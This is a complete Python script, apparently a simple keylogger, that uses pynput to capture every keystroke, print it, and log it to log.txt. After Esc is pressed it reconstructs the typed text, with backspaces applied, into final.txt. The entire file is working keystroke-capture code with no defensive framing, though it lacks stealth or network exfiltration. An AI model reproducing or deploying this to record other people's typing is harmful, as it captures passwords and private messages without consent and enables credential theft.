import pynput
from pynput.keyboard import Key, Listener
import os

cnt = 0
keys = []


def on_press(key):
    global keys, cnt
    keys.append(key)
    cnt += 1
    print("{} pressed".format(key))
    if cnt >= 1:
        cnt = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in keys:
            # print("The key rn is ", key)
            if key == Key.backspace:
                f.write('¶')
                continue
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            # elif k.find("backspace") > 0:
            #     remove_last_char("log.txt")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        open('log.txt', 'a').close()
        return False


def deleteContent(fName):
    with open(fName, "w"):
        pass


def remove_backspace(S):
    q = []
    for i in range(0, len(S)):
        if S[i] != '¶':
            q.append(S[i])
        elif len(q) != 0:
            q.pop()
    # Build final string
    ans = ""
    while len(q) != 0:
        ans += q[0]
        q.pop(0)
    # return final string
    return ans


def get_final_file(fileName):
    log = open(fileName, 'r', encoding="utf-8")
    lines = log.readlines()
    with open("final.txt", 'w') as f:
        for line in lines:
            f.write(remove_backspace(line))


if __name__ == '__main__':
    fileName = "log.txt"
    deleteContent(fileName)
    deleteContent("final.txt")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    get_final_file(fileName)
